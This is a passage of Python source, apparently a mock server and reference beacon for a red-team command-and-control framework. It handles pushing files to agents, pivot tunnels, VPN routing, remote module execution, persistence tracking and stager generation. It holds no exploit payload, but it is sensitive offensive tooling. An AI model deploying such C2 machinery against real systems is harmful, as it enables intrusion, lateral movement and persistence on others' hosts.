            eof = bool(args.get("eof", False))
            with self._lock:
                if offset == 0:
                    # The first chunk starts a fresh upload and replaces
                    # whatever was stored under the name before.
                    self.artifact_uploads[name] = bytearray()
                buf = self.artifact_uploads.get(name)
                if buf is None:
                    return fail("artifact.put: the upload does not start at offset 0")
                if offset != len(buf):
                    return fail("artifact.put: the chunk is out of order")
                buf.extend(data)
                received = len(buf)
                if not eof:
                    return ok({"name": name, "received": received, "eof": False})
                blob = bytes(buf)
                self.artifact_uploads.pop(name, None)
                digest = hashlib.sha256(blob).hexdigest()
                now = _now()
                old = self.artifacts.get(name)
                self.artifacts[name] = {
                    "name": name,
                    "sha256": digest,
                    "size": len(blob),
                    "created": old["created"] if old else now,
                    "updated": now,
                    "data": blob,
                }
            return ok({"name": name, "sha256": digest, "size": len(blob),
                       "eof": True})

        if cmd == "artifact.get":
            name = str(args.get("name", ""))
            offset = int(args.get("offset", 0) or 0)
            limit = int(args.get("limit", 0) or 0)
            with self._lock:
                rec = self.artifacts.get(name)
                if rec is None:
                    return fail("artifact.get: no such artifact")
                blob = rec["data"]
                size = len(blob)
                start = max(0, min(offset, size))
                end = size if limit <= 0 else min(size, start + limit)
                chunk = blob[start:end]
                row = {
                    "name": name,
                    "sha256": rec["sha256"],
                    "size": size,
                    "offset": start,
                    "eof": end >= size,
                    "data": chunk,
                }
            return ok(row)

        if cmd == "artifact.remove":
            name = str(args.get("name", ""))
            with self._lock:
                if name not in self.artifacts:
                    return fail("artifact.remove: no such artifact")
                del self.artifacts[name]
                self.artifact_uploads.pop(name, None)
            return ok({"name": name, "removed": True})

        if cmd == "artifact.push":
            # The file travels to the agent as a chain of upload tasks, one
            # per chunk: the beacon writes them one after the other and only
            # the last one closes the file and reports its digest.
            name = str(args.get("name", ""))
            agent_id = str(args.get("agent", "") or args.get("id", "") or "")
            if not name:
                return fail("artifact.push needs a name")
            if not agent_id:
                return fail("artifact.push needs an agent")
            with self._lock:
                rec = self.artifacts.get(name)
                if rec is None:
                    return fail("artifact.push: no such artifact")
                blob = rec["data"]
                digest = rec["sha256"]
                size = rec["size"]
            problem = self._refusal(agent_id, "upload")
            if problem:
                return fail(problem)
            path = str(args.get("path", "") or "") or f"/tmp/{name}"
            stages = []
            for off in range(0, max(len(blob), 1), ARTIFACT_CHUNK):
                end = min(off + ARTIFACT_CHUNK, len(blob))
                stages.append({
                    "kind": "upload",
                    "args": {
                        "path": path,
                        "offset": off,
                        "data": blob[off:end],
                        "eof": end >= len(blob),
                    },
                })
            chain_id = new_id("chain")
            with self._lock:
                if agent_id not in self.agents:
                    return fail(f"unknown agent {agent_id!r}")
                self.chains[chain_id] = {
                    "id": chain_id,
                    "agent_id": agent_id,
                    "stages": stages,
                    "stage": 0,
                }
            task = self._queue_task(agent_id, "upload", stages[0]["args"])
            with self._lock:
                task["chain_id"] = chain_id
                task["stage"] = 0
            self.emit("chain.started", agent_id, task_id=task["id"],
                      data={"chain": chain_id, "stages": len(stages)})
            return ok({"chain_id": chain_id, "task_id": task["id"],
                       "agent_id": agent_id, "stages": len(stages),
                       "size": size, "sha256": digest, "path": path})

        # ---- pivoting ---------------------------------------------------
        if cmd == "pivot.list":
            with self._lock:
                tunnels = [dict(t) for t in self.pivots.values()]
                sessions = len(self.tunnel_sessions)
            # The topology takes the lock itself: it is a picture of
            # everything the manager knows.
            topology = self._pivot_topology()
            return ok({"tunnels": tunnels, "sessions": sessions, "topology": topology})

        if cmd == "transport.set":
            agent = str(args.get("agent", "") or "").strip()
            if not agent:
                return fail("transport.set: the agent is missing")
            with self._lock:
                known = agent in self.agents
            if not known:
                return fail(f"transport.set: unknown agent {agent!r}")
            primary = str(args.get("primary", "") or "").strip().lower()
            if not primary:
                return fail("transport.set: the primary transport is missing")
            if primary not in TRANSPORTS:
                return fail(
                    f"transport.set: {primary!r} is not a transport the framework knows"
                )
            fallback = []
            for name in args.get("fallback") or []:
                name = str(name).strip().lower()
                if name and name not in TRANSPORTS:
                    return fail(
                        f"transport.set: {name!r} is not a transport the framework knows"
                    )
                if name:
                    fallback.append(name)
            route = {
                "primary": primary,
                "fallback": fallback,
                "front": str(args.get("front", "") or "").strip(),
                "inspect": bool(args.get("inspect", False)),
                "http_path": str(args.get("http_path", "") or "").strip(),
                "ws_path": str(args.get("ws_path", "") or "").strip(),
            }
            with self._lock:
                self.routes[agent] = route
            self.emit("agent.route", agent, data={
                "primary": route["primary"],
                "fallback": ",".join(route["fallback"]),
                "front": route["front"],
                "inspect": route["inspect"],
            })
            out = dict(route)
            out["agent"] = agent
            return ok(out)

        if cmd == "transport.get":
            agent = str(args.get("agent", "") or "").strip()
            if not agent:
                return fail("transport.get: the agent is missing")
            with self._lock:
                route = self.routes.get(agent)
            if route is None:
                return fail(f"transport.get: the agent {agent!r} has no route")
            out = dict(route)
            out["agent"] = agent
            return ok(out)

        if cmd == "transport.list":
            with self._lock:
                routes = {
                    agent: dict(route) for agent, route in self.routes.items()
                }
            out = []
            for agent in sorted(routes):
                item = routes[agent]
                item["agent"] = agent
                out.append(item)
            return ok({"routes": out})

        if cmd == "pivot.open":
            agent_id = str(args.get("id", ""))
            mode = str(args.get("mode", "socks")) or "socks"
            host = str(args.get("host", ""))
            port = int(args.get("port", 0) or 0)
            listen = str(args.get("listen", "")) or "127.0.0.1:0"
            dns = str(args.get("dns", "remote")) or "remote"
            claim = str(args.get("claim", "") or "")
            through = str(args.get("through", "") or "")
            # The path of a chained pivot: the hops after the first agent.
            # The operator names the far end; the server walks the path.
            path = [str(x) for x in (args.get("path") or []) if str(x)]
            if path:
                through = path[0]
            user = str(args.get("user", "") or "")
            password = str(args.get("password", "") or "")
            loopback = bool(args.get("loopback", False))
            with self._lock:
                known = agent_id in self.agents
            if not known:
                return fail(f"unknown agent {agent_id!r}")
            if dns not in ("remote", "local"):
                return fail(f"pivot.open: unknown dns mode {dns!r}")
            # A named pipe is the Windows equivalent of a Unix socket: it
            # lives in the file system of the host, so only a process on
            # the host can open it.  The mock has no named pipe of its
            # own, so it uses a socket of the file system, which has the
            # same shape.
            pipe = bool(args.get("pipe", False))
            pipe_name = str(args.get("pipe_name", "") or "")
            # The listener is bound before the agent is asked for a
            # session: the session is taken when the first connection
            # arrives, so a forward outlives the session it was opened
            # with.
            lhost, _, lport = listen.rpartition(":")
            lhost = lhost.strip("[]")
            if loopback:
                # The family of the listener is kept: an IPv6 listener
                # stays on the IPv6 loopback.
                lhost = "::1" if ":" in lhost else "127.0.0.1"
            if pipe:
                pipe_path = pipe_name or f"/tmp/umbra-pipe-{new_id('tun')}"
                listener = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                try:
                    listener.bind(pipe_path)
                except OSError as exc:
                    listener.close()
                    return fail(f"pivot.open: the named pipe {pipe_path}: {exc}")
                listener.listen(16)
                address = f"pipe:{pipe_path}"
            else:
                family = socket.AF_INET6 if ":" in lhost else socket.AF_INET
                listener = socket.socket(family, socket.SOCK_STREAM)
                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                try:
                    listener.bind((lhost or "127.0.0.1", int(lport or 0)))
                except OSError as exc:
                    listener.close()
                    return fail(f"pivot.open: listen {listen}: {exc}")
                listener.listen(16)
                bound = listener.getsockname()
                # An IPv6 address needs brackets, the way the Go server
                # renders it: "host:port" is not enough for "::1".
                if ":" in str(bound[0]):
                    address = f"[{bound[0]}]:{bound[1]}"
                else:
                    address = f"{bound[0]}:{bound[1]}"
            tunnel_id = new_id("tun")
            with self._lock:
                self.pivots[tunnel_id] = {
                    "stream": tunnel_id,
                    "agent_id": agent_id,
                    "mode": mode,
                    "listen": address,
                    "host": host,
                    "port": port,
                    "opened": _now(),
                    "last_active": _now(),
                    "streams": 0,
                    "bytes_up": 0,
                    "bytes_down": 0,
                    "state": "open",
                    "claim": claim,
                    "through": through,
                    "path": list(path),
                    "dns": dns,
                    "pipe": pipe,
                }
                if claim:
                    self.pivot_claims.setdefault(claim, []).append(tunnel_id)
            t = threading.Thread(
                target=self._pivot_accept,
                args=(listener, mode, host, port, tunnel_id, agent_id,
                      user, password, dns, list(self.pivot_deny), list(path)),
                daemon=True,
            )
            t.start()
            self.emit("pivot.opened", agent_id, data={"tunnel": tunnel_id,
                                                       "listen": address,
                                                       "claim": claim})
            return ok({
                "stream": tunnel_id,
                "agent_id": agent_id,
                "mode": mode,
                "listen": address,
                "host": host,
                "port": port,
                "claim": claim,
                "through": through,
                "path": list(path),
                "dns": dns,
                "pipe": pipe,
            })

        if cmd == "pivot.close":
            tunnel_id = str(args.get("stream", ""))
            with self._lock:
                info = self.pivots.pop(tunnel_id, None)
                if info is not None:
                    claim = str(info.get("claim", "") or "")
                    if claim and tunnel_id in self.pivot_claims.get(claim, []):
                        self.pivot_claims[claim] = [
                            t for t in self.pivot_claims[claim] if t != tunnel_id
                        ]
                        if not self.pivot_claims[claim]:
                            self.pivot_claims.pop(claim, None)
            if info is None:
                return fail(f"unknown tunnel {tunnel_id!r}")
            info["state"] = "closed"
            self.emit("pivot.closed", str(info.get("agent_id", "")), data={"tunnel": tunnel_id})
            return ok({"stream": tunnel_id, "closed": True})

        if cmd == "pivot.claim":
            with self._lock:
                claims = [
                    {"claim": name, "tunnels": list(ids)}
                    for name, ids in sorted(self.pivot_claims.items())
                ]
            return ok({"claims": claims, "count": len(claims)})

        if cmd == "pivot.release":
            claim = str(args.get("claim", "") or "").strip()
            if not claim:
                return fail("pivot.release: the release needs the name of a claim")
            with self._lock:
                ids = list(self.pivot_claims.pop(claim, []))
                for tunnel_id in ids:
                    info = self.pivots.pop(tunnel_id, None)
                    if info is not None:
                        info["state"] = "closed"
            for tunnel_id in ids:
                self.emit("pivot.closed", "", data={"tunnel": tunnel_id,
                                                    "claim": claim})
            return ok({"claim": claim, "closed": ids, "count": len(ids)})

        # ---- layer-3 tunnel ----------------------------------------------
        if cmd == "vpn.status":
            status = self.vpn.status()
            status["listen"] = self.vpn.address()
            peers = self.vpn.peers()
            status["bytes_in"] = sum(int(p.get("bytes_in", 0)) for p in peers)
            status["bytes_out"] = sum(int(p.get("bytes_out", 0)) for p in peers)
            return ok(status)

        if cmd == "vpn.peers":
            peers = self.vpn.peers()
            return ok({"peers": peers, "count": len(peers)})

        if cmd == "vpn.routes":
            routes = self.vpn.routes()
            return ok({
                "routes": [
                    {
                        "peer": r["peer"],
                        "network": r["network"],
                        "bytes": r["bytes"],
                        "packets": r["packets"],
                    }
                    for r in routes
                ],
                "count": len(routes),
            })

        if cmd == "vpn.route":
            peer = str(args.get("peer", ""))
            network = str(args.get("network", ""))
            if not peer or not network:
                return fail("vpn.route needs a peer and a network")
            if bool(args.get("remove", False)):
                if not self.vpn.remove_route(network):
                    return fail(f"vpn.route: no route for {network!r}")
                return ok({"removed": True, "network": network})
            try:
                route = self.vpn.set_route(peer, network)
            except KeyError:
                return fail(f"vpn.route: unknown peer {peer!r}")
            except ValueError as exc:
                return fail(f"vpn.route: {exc}")
            return ok({
                "peer": route["peer"],
                "network": route["network"],
                "bytes": route["bytes"],
                "packets": route["packets"],
            })

        if cmd == "vpn.ping":
            peer = str(args.get("peer", ""))
            if not peer:
                return fail("vpn.ping needs a peer")
            timeout = 5.0
            try:
                timeout = max(0.1, int(args.get("timeout_ms", 5000)) / 1000.0)
            except (TypeError, ValueError):
                pass
            try:
                rtt = self.vpn.ping(peer, timeout=timeout)
            except KeyError:
                return fail(f"vpn.ping: unknown peer {peer!r}")
            except TimeoutError:
                return fail("vpn.ping: the peer did not answer")
            return ok({
                "peer": peer,
                "rtt_ms": int(rtt * 1000),
                "rtt_text": f"{rtt * 1000:.3f}ms",
            })

        if cmd == "vpn.allocate":
            agent_id = str(args.get("id", ""))
            with self._lock:
                known = agent_id in self.agents
            if not known:
                return fail(f"unknown agent {agent_id!r}")
            address = self.vpn.allocate(agent_id)
            return ok({"id": agent_id, "address": address})

        # ---- extension store ----------------------------------------------
        if cmd == "armory.list":
            with self._lock:
                installed = [dict(e) for e in self.armory.values()]
            return ok({
                "entries": [_module_view(e) for e in installed],
                "installed": [
                    {
                        "name": e["name"],
                        "version": e.get("version", ""),
                        "sha256": e["sha256"],
                        "size": e["size"],
                        "installed": _now(),
                        "caps": list(e.get("caps") or []),
                        "format": e.get("format", ""),
                    }
                    for e in installed
                ],
                "verified": True,
            })

        if cmd == "armory.search":
            query = str(args.get("query", "")).strip().lower()
            with self._lock:
                entries = [dict(e) for e in self.armory.values()]
            found = [e for e in entries if not query or _module_matches(e, query)]
            found.sort(key=lambda e: e["name"])
            return ok({
                "entries": [_module_view(e) for e in found],
                "count": len(found),
                "query": query,
            })

        if cmd == "armory.needs":
            name = str(args.get("name", ""))
            if not name:
                return fail("armory.needs needs a name")
            with self._lock:
                entry = self.armory.get(name)
            if entry is None:
                return fail(f"unknown extension {name!r}")
            missing = [dep for dep in entry.get("requires", [])
                       if dep not in self.armory]
            return ok({
                "name": entry["name"],
                "version": entry.get("version", ""),
                "format": entry.get("format", ""),
                "os": entry.get("os", "windows"),
                "arch": entry.get("arch", "amd64"),
                "digest": entry.get("sha256", ""),
                "caps": list(entry.get("caps") or []),
                "args": list(entry.get("args") or []),
                "output": dict(entry.get("output") or {}),
                "requires": list(entry.get("requires") or []),
                "missing": missing,
            })

        if cmd == "armory.versions":
            name = str(args.get("name", ""))
            if not name:
                return fail("armory.versions needs a name")
            with self._lock:
                versions = sorted(
                    [e.get("version", "") for e in self.armory.values()
                     if e["name"] == name],
                    reverse=True,
                )
            return ok({"name": name, "versions": versions, "count": len(versions)})

        if cmd == "armory.resolve":
            name = str(args.get("name", ""))
            if not name:
                return fail("armory.resolve needs a name")
            with self._lock:
                entry = self.armory.get(name)
            if entry is None:
                return fail(f"unknown extension {name!r}")
            order = []
            seen = set()

            def visit(current: str) -> None:
                if current in seen:
                    return
                seen.add(current)
                with self._lock:
                    dep = self.armory.get(current)
                if dep is None:
                    return
                for required in dep.get("requires", []):
                    visit(required)
                order.append(current)

            visit(name)
            return ok({
                "name": name,
                "order": order,
                "count": len(order),
                "modules": [_module_view(self.armory[n]) for n in order
                            if n in self.armory],
                "resolved": True,
            })

        if cmd == "armory.import":
            url = str(args.get("url", ""))
            if not url:
                return fail("armory.import needs an url")
            # The test double has no mirror to talk to.  It answers with the
            # catalogue it already holds, so the console path is exercised
            # end to end; the real server fetches the catalogue over https
            # and verifies every signature before it merges it.
            with self._lock:
                count = len(self.armory)
            return ok({
                "source": url,
                "entries": count,
                "url": url,
                "verified": True,
            })

        if cmd == "armory.install":
            name = str(args.get("name", ""))
            if not name:
                return fail("armory.install needs a name")
            with self._lock:
                entry = self.armory.get(name)
            if entry is None:
                return fail(f"unknown extension {name!r}")
            return ok({
                "name": entry["name"],
                "version": entry.get("version", ""),
                "sha256": entry["sha256"],
                "size": entry["size"],
                "installed": _now(),
            })

        if cmd == "armory.remove":
            name = str(args.get("name", ""))
            with self._lock:
                entry = self.armory.pop(name, None)
            if entry is None:
                return fail(f"unknown extension {name!r}")
            return ok({"name": name, "removed": True})

        if cmd == "armory.run":
            name = str(args.get("name", ""))
            agent_id = str(args.get("id", ""))
            with self._lock:
                entry = self.armory.get(name)
                known = agent_id in self.agents
            if entry is None:
                return fail(f"unknown extension {name!r}")
            if not known:
                return fail(f"unknown agent {agent_id!r}")
            # The capability negotiation: a module that needs something the
            # host cannot do is never pushed to it.  The agent says what it
            # can do in its handshake; an agent that says nothing is allowed
            # everything, because it predates the list.
            caps = self.agent_caps(agent_id)
            missing = [c for c in entry.get("caps", []) if c not in caps]
            if missing:
                return fail(
                    f"the agent {agent_id} cannot run {name}: it lacks "
                    f"{', '.join(missing)}"
                )
            task = {
                "id": new_id("t"),
                "agent_id": agent_id,
                "kind": "ext",
                "args": {
                    "name": name,
                    "data": entry["data"],
                    "args": args.get("args") or {},
                    "manifest": _module_manifest(entry),
                },
                "state": "queued",
                "code": 0,
                "out": b"",
                "err": "",
                "created": _now(),
            }
            with self._lock:
                self.tasks[task["id"]] = task
            return ok({"task_id": task["id"], "agent_id": agent_id, "name": name})

        # ---- command namespace ---------------------------------------------
        if cmd == "alias.list":
            with self._lock:
                aliases = [dict(a) for a in self.aliases.values()]
            return ok({"aliases": aliases, "count": len(aliases)})

        if cmd == "alias.add":
            # The command namespace is shared: the team writes the aliases
            # everybody uses, and everybody sees who wrote them.
            name = str(args.get("name", "")).strip()
            if not name:
                return fail("alias.add needs a name")
            kind = str(args.get("kind", "") or "")
            extension = str(args.get("extension", "") or "")
            if not kind and not extension:
                return fail("alias.add needs a kind or an extension")
            entry = {
                "name": name,
                "kind": kind,
                "extension": extension,
                "args": args.get("args") or {},
                "args_spec": list(args.get("args_spec") or []),
                "description": str(args.get("description", "") or ""),
                "by": operator,
                "created": _now(),
            }
            with self._lock:
                self.aliases[name] = entry
            self.emit("alias.created", data={"name": name, "kind": kind})
            return ok({"name": name, "kind": kind, "by": operator, "created": True})

        if cmd == "alias.remove":
            name = str(args.get("name", ""))
            with self._lock:
                if name not in self.aliases:
                    return fail(f"alias.remove: unknown alias {name!r}")
                del self.aliases[name]
            self.emit("alias.removed", data={"name": name})
            return ok({"name": name, "removed": True})

        if cmd == "alias.run":
            name = str(args.get("name", ""))
            agent_id = str(args.get("id", ""))
            with self._lock:
                entry = self.aliases.get(name)
                known = agent_id in self.agents
            if entry is None:
                return fail(f"unknown alias {name!r}")
            if not known:
                return fail(f"unknown agent {agent_id!r}")
            task_args = {**entry.get("args", {}), **(args.get("args") or {})}
            # An alias that names an extension expands into the module
            # task, and the manifest of that module travels with it: the
            # target refuses a module it cannot read.
            extension = str(entry.get("extension", "") or "")
            if extension:
                with self._lock:
                    module = self.armory.get(extension)
                if module is None:
                    return fail(f"unknown extension {extension!r}")
                task_args = {
                    "name": extension,
                    "data": module["data"],
                    "args": task_args,
                    "manifest": _module_manifest(module),
                }
            task = {
                "id": new_id("t"),
                "agent_id": agent_id,
                "kind": entry["kind"],
                "args": task_args,
                "state": "queued",
                "code": 0,
                "out": b"",
                "err": "",
                "created": _now(),
            }
            with self._lock:
                self.tasks[task["id"]] = task
            return ok({"task_id": task["id"], "agent_id": agent_id, "name": name})

        # ---- team ------------------------------------------------------------
        if cmd == "team.sync":
            with self._lock:
                agents = [dict(a) for a in self.agents.values()]
                operators = [dict(o) for o in self.op_sessions.values()]
                chat = [dict(m) for m in self.chat[-50:]]
            return ok({
                "server_time": _now(),
                "version": "mock",
                "agents": agents,
                "operators": operators,
                "chat": chat,
            })

        if cmd == "team.handover":
            # The handover: everything a colleague needs to take the
            # engagement over.  The server knows the engagement; the
            # console adds its own notes to the document it renders.
            now = time.time()
            with self._lock:
                agents = [dict(a) for a in self.agents.values()]
                open_tasks = [dict(t) for t in self.tasks.values()
                              if t.get("state") in ("queued", "delivered")]
                findings = [dict(t) for t in self.tasks.values()
                            if t.get("kind") == "recon"]
                sessions = [dict(s) for s in self.open_sessions.values()]
                artifacts = [dict(a) for a in self.artifacts.values()]
                operators = []
                for name, live in sorted(self.op_sessions.items()):
                    idle = int(max(0.0, now - live.get("last_seen", now)))
                    operators.append({
                        "name": name,
                        "role": live.get("role", ""),
                        "focus": live.get("focus", ""),
                        "idle_sec": idle,
                        "stale": idle >= CLAIM_LEASE,
                    })
                persistence = []
                for agent in self.agents.values():
                    for entry in agent.get("persist", []) or []:
                        persistence.append({
                            "agent_id": agent.get("id", ""),
                            "technique": entry.get("technique", ""),
                            "name": entry.get("name", ""),
                            "location": entry.get("location", ""),
                            "state": entry.get("state", ""),
                        })
            finding_rows = []
            for task in findings:
                row = {
                    "task_id": task.get("id", ""),
                    "agent_id": task.get("agent_id", ""),
                    "at": task.get("created", 0),
                }
                meta = task.get("meta") or {}
                if "recon_total" in meta:
                    row["total"] = meta["recon_total"]
                out = task.get("out") or b""
                if isinstance(out, (bytes, bytearray)):
                    out = bytes(out)
                if out:
                    row["excerpt"] = out[:400].decode("utf-8", "replace")
                finding_rows.append(row)
            task_rows = []
            for task in open_tasks:
                row = {
                    "id": task.get("id", ""),
                    "agent_id": task.get("agent_id", ""),
                    "kind": task.get("kind", ""),
                    "state": task.get("state", ""),
                    "created": task.get("created", 0),
                }
                if task.get("claimed_by"):
                    row["claimed_by"] = task["claimed_by"]
                if task.get("assigned_to"):
                    row["assigned_to"] = task["assigned_to"]
                task_rows.append(row)
            return ok({
                "generated": _now(),
                "by": operator,
                "agents": agents,
                "tasks": task_rows,
                "findings": finding_rows,
                "persistence": persistence,
                "sessions": sessions,
                "artifacts": artifacts,
                "operators": operators,
                "events": [dict(e) for e in self.events[-25:]],
            })

        # ---- stagers ----------------------------------------------------------
        if cmd == "stager.generate":
            platform = str(args.get("platform", "windows"))
            transport = str(args.get("transport", "tcp"))
            server = str(args.get("server", "")) or "127.0.0.1:4001"
            url = str(args.get("url", ""))
            digest = str(args.get("sha256", ""))
            agent_id = str(args.get("agent_id", ""))
            mode = str(args.get("mode", "download"))
            store_name = str(args.get("store", ""))
            store_base = str(args.get("store_base", ""))
            script = _render_stager(
                platform=platform,
                transport=transport,
                server=server,
                url=url,
                digest=digest,
                agent_id=agent_id,
                mode=mode,
                store_name=store_name,
                store_base=store_base,
                args=args,
            )
            if script is None:
                return fail("stager.generate: the stager cannot be rendered")
            return ok({
                "platform": platform,
                "transport": transport,
                "server": server,
                "mode": mode,
                "stager": script,
            })

        return fail(f"unknown command {cmd!r}")

    # -- events ----------------------------------------------------------
    def emit(
        self,
        kind: str,
        agent_id: str = "",
        *,
        task_id: str = "",
        data: Optional[Dict[str, Any]] = None,
        to: str = "",
        sender: str = "",
    ) -> None:
        """Publish an event; `to` addresses it to one console (empty = team)."""
        ev = {"kind": kind, "at": _now(), "agent_id": agent_id, "task_id": task_id, "data": data or {}}
        if sender:
            ev["from"] = sender
        if to:
            ev["to"] = to
        with self._lock:
            self._event_seq += 1
            ev["seq"] = self._event_seq
            self.events.append(ev)
            if len(self.events) > 2000:
                del self.events[:len(self.events) - 2000]
            subs = list(self.subscribers)
        for name, q in subs:
            if to and name not in (to, sender):
                continue
            try:
                q.put_nowait(ev)
            except queue.Full:
                pass


def _string_list(value: Any) -> List[str]:
    """Read a list of strings; a comma separated string counts as one."""
    if value is None:
        return []
    if isinstance(value, str):
        return [part.strip() for part in value.split(",") if part.strip()]
    if isinstance(value, (list, tuple)):
        out = []
        for item in value:
            if isinstance(item, str) and item.strip():
                out.append(item.strip())
        return out
    return []


def _filter_of(args: Dict[str, Any]) -> Dict[str, Any]:
    """The filter of an RPC: a nested map or the flat arguments."""
    raw = args.get("filter")
    keys = ("state", "transport", "os", "arch", "tag", "user", "persisted")
    if isinstance(raw, dict):
        merged = dict(raw)
        for key in keys:
            if key not in merged and key in args:
                merged[key] = args[key]
        return merged
    return {key: args[key] for key in keys if key in args}


def _agent_matches(agent: Dict[str, Any], args: Dict[str, Any]) -> bool:
    """Does the agent match the filter of the call?"""
    filt = _filter_of(args)
    for key in ("state", "transport", "os", "arch", "user"):
        want = filt.get(key)
        if want in (None, ""):
            continue
        if str(agent.get(key, "")).lower() != str(want).lower():
            return False
    tag = filt.get("tag")
    if tag:
        tags = [str(t).lower() for t in agent.get("tags", [])]
        if str(tag).lower() not in tags:
            return False
    persisted = filt.get("persisted")
    if persisted not in (None, ""):
        covered = len(agent.get("persist") or []) > 0
        want = str(persisted).lower()
        if want in ("1", "yes", "true") and not covered:
            return False
        if want in ("0", "no", "false") and covered:
            return False
    return True


def _has_targets(args: Dict[str, Any]) -> bool:
    """Did the call name any target at all?"""
    if _string_list(args.get("agents")) or _string_list(args.get("ids")):
        return True
    return bool(_filter_of(args))


def _select_agents(agents: Dict[str, Any], args: Dict[str, Any]) -> List[Dict[str, Any]]:
    """The agents an operation applies to: the named ones, narrowed by the filter."""
    named = _string_list(args.get("agents")) or _string_list(args.get("ids"))
    out = []
    for rec in agents.values():
        if named and rec["id"] not in named:
            continue
        if not _agent_matches(rec, args):
            continue
        out.append(rec)
    return out


def _task_out(task: Dict[str, Any]) -> Dict[str, Any]:
    """Normalise a task record for the wire (bytes stay bytes, upk encodes them)."""
    out = dict(task)
    if isinstance(out.get("out"), (bytes, bytearray)):
        out["out"] = bytes(out["out"])
    return out


# The presence window and the claim lease: the same numbers as the Go hub.
#
# The presence of a console expires, and so does the claim a console holds:
# a console that crashed must not keep a task to itself.
PRESENCE_TTL = 90
CLAIM_LEASE = 120

# The queue of the mock server: the same limits as the Go hub.
BREAKER_THRESHOLD = 5
MAX_ATTEMPTS = 3

# The handshake version the fake agent speaks, and the module ABI it
# claims: the same numbers the Rust beacon and the Go server use.
HELLO_VERSION = wire.HELLO_VERSION
ABI_VERSION = wire.ABI_VERSION


def _expand_workflow_steps(steps: List[Any], params: Dict[str, str]) -> List[Dict[str, Any]]:
    """Fill the parameters of the steps of a workflow.

    The placeholders are {{name}}: the workflow says {{target}} and the
    operator gives the target when the workflow runs.
    """
    out: List[Dict[str, Any]] = []
    for raw in steps:
        if not isinstance(raw, dict):
            continue
        step: Dict[str, Any] = {}
        for key, value in raw.items():
            if isinstance(value, str):
                step[key] = _expand_params(value, params)
            elif isinstance(value, dict):
                step[key] = _expand_params_map(value, params)
            elif isinstance(value, list):
                step[key] = [_expand_params_map(item, params) if isinstance(item, dict)
                             else _expand_params(item, params) if isinstance(item, str)
                             else item for item in value]
            else:
                step[key] = value
        out.append(step)
    return out


def _expand_params_map(value: Dict[str, Any], params: Dict[str, str]) -> Dict[str, Any]:
    """Fill the parameters of a nested map."""
    out: Dict[str, Any] = {}
    for key, item in value.items():
        out[key] = _expand_params(item, params) if isinstance(item, str) else item
    return out


def _expand_params(text: str, params: Dict[str, str]) -> str:
    """Replace the {{name}} placeholders of a text."""
    if not text or not params:
        return text
    for name, value in params.items():
        text = text.replace("{{" + str(name) + "}}", str(value))
    return text


def _parse_mentions(text: str) -> List[str]:
    """The operators a chat line names with an @."""
    out: List[str] = []
    seen = set()
    for field in text.replace(",", " ").replace(".", " ").split():
        if not field.startswith("@") or len(field) < 2:
            continue
        name = field[1:].strip("!?;:()[]\"'*")
        if not name or name in seen:
            continue
        seen.add(name)
        out.append(name)
    return out


# Mirrors store.CHUNK_MAX / the Rust beacon's output budget: one transfer step
# never carries more than this, so it always fits in a single RESULT frame.
CHUNK_MAX = 900 * 1024
# Mirrors hub.maxEventOutput: events carry a preview, not the payload.
EVENT_OUTPUT_MAX = 4096


# ---------------------------------------------------------------------------
# reference agent (Python stand-in for the Rust beacon)
# ---------------------------------------------------------------------------
class FakeAgent(threading.Thread):
    """A minimal, well-behaved beacon used to develop without the Rust build."""

    def __init__(
        self,
        server: str,
        psk: bytes,
        agent_id: str = "",
        *,
        transport_meta: Optional[Dict[str, Any]] = None,
        execute_shell: bool = True,
        interval: float = 0.3,
        websocket: bool = False,
        peer_listen: str = "",
        peer_psk: Optional[bytes] = None,
        transport: str = "",
        mail_addr: str = "",
        pop3_addr: str = "",
        s3_addr: str = "",
        vpn_addr: str = "",
    ) -> None:
        super().__init__(daemon=True, name="mock-agent")
        self.server = server
        # The key the operator wrote: hex is decoded, exactly like the
        # implants do, so a beacon built with the text the server printed
        # talks to it.
        self.psk = decode_psk_bytes(psk)
        self.agent_id = agent_id or new_id("agent")
        # The address of the peer listener: where another beacon (or the
        # server) can dial in to carry a pivot through this host.
        self.peer_listen = peer_listen
        # The key of the peer listener.  It is the agent key by default; a
        # different one is how a broken peer link is simulated.
        self.peer_psk = peer_psk if peer_psk is not None else psk
        self.peer_address = ""
        # The WebSocket transport talks to the same server, but through an
        # HTTP upgrade instead of a raw socket.
        self.websocket = websocket
        # The transports without a connection: the mail transport and the
        # object transport.  Their addresses are the ones of the mock
        # server, which listens on ports of its own.
        self.transport = transport
        self.mail_addr = mail_addr
        self.pop3_addr = pop3_addr
        self.s3_addr = s3_addr
        # The endpoint of the layer-3 tunnel.  It is a socket of its own,
        # so it has an address of its own.
        self.vpn_addr = vpn_addr
        self.meta = transport_meta or {
            "host": "lab-host",
            # The transport the beacon speaks: it changes when the
            # operator gives the agent a different route.
            "transport": "ws" if websocket else "tcp",
            "os": sys.platform,
            "arch": "x86_64",
            "user": os.environ.get("USER", "lab"),
            "pid": os.getpid(),
            "integ": "medium",
            "ver": "py-ref",
            # The capability list travels in the handshake: the server
            # refuses to queue a task the agent cannot run.
            "caps": list(AGENT_CAPS),
        }
        self.execute_shell = execute_shell
        # When the fake agent started: the heartbeat carries the uptime.
        self.started = time.time()
        self.interval = interval
        self._stop = threading.Event()
        self.completed = threading.Event()
        self.sent_bye = False
        self.rekeys = 0
        self.cancelled_ids: List[str] = []
        # Control frames actually received (proves 0x18 is on the wire).
        self.cancels_received: List[str] = []
        # The last policy the server pushed (sleep, jitter, obfuscation).
        self.policy: Dict[str, Any] = {}
        # The route the server pushed: the transport this beacon speaks and
        # the order it may fall back in.
        self.route: Dict[str, Any] = {}
        # The interactive sessions the agent has open.
        self.sessions: Dict[str, Dict[str, Any]] = {}
        # What the operator installed on this host.  The desktop beacon
        # keeps it in a state file; the mock keeps it in memory, with the
        # same shape so the server sees one thing.
        self.persist: List[Dict[str, Any]] = []
        # The posture of the fake host and the settings of the evasion
        # engine: the schedule, the shaping and the kill switch.
        self.posture_name = "workstation"
        self.evade: Dict[str, Any] = {}
        # The account the fake implant is running as, when the operator made
        # it become somebody else.  It travels with the check-in, exactly
        # like the real implant does.
        self.impersonation: str = ""

    def stop(self) -> None:
        self._stop.set()
        peer = getattr(self, "vpn_peer", None)
        if peer is not None:
            peer.close()

    def run(self) -> None:
        if self.peer_listen:
            threading.Thread(target=self._peer_listener, args=(self.peer_listen,),
                             daemon=True).start()
        while not self._stop.is_set():
            try:
                if self.transport in ("smtp", "s3"):
                    self._batch_cycle()
